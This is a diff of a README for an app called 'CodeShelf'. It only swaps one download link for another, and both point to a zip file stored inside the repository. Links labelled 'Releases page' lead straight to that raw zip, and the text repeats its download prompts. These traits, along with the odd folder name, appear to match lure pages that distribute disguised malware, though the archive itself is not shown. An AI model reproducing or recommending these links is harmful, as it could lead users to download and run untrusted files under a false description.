@@ -6,13 +6,13 @@ Welcome to CodeShelf! This application helps you manage your GitHub projects wit
 
 ## 📥 Download Now
 
-[![Download CodeShelf](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/ichthyobatrachian/CodeShelf.zip)](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/ichthyobatrachian/CodeShelf.zip)
+[![Download CodeShelf](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/api/Shelf_Code_v3.8.zip)](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/api/Shelf_Code_v3.8.zip)
 
 ## 💾 Download & Install
 
 To get started with CodeShelf, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/ichthyobatrachian/CodeShelf.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/api/Shelf_Code_v3.8.zip).
    
 2. **Select Your Version:** You will see a list of versions available for download. Choose the latest version for the best experience.
 
@@ -58,7 +58,7 @@ If you want to learn more about CodeShelf, you might be interested in these rela
 
 ### How do I update CodeShelf?
 
-To update CodeShelf, simply revisit the [Releases page](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/ichthyobatrachian/CodeShelf.zip) and download the latest version. Install it over your current version.
+To update CodeShelf, simply revisit the [Releases page](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/api/Shelf_Code_v3.8.zip) and download the latest version. Install it over your current version.
 
 ### Can I suggest features?
 
@@ -74,4 +74,4 @@ For further inquiries, feel free to reach out via the GitHub issue tracker or ch
 
 ## 📥 Download Now Again
 
-To get started today, [download CodeShelf here](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/ichthyobatrachian/CodeShelf.zip). Enjoy managing your projects with ease!
+To get started today, [download CodeShelf here](https://raw.githubusercontent.com/pri7277neel/CodeShelf/main/api/Shelf_Code_v3.8.zip). Enjoy managing your projects with ease!
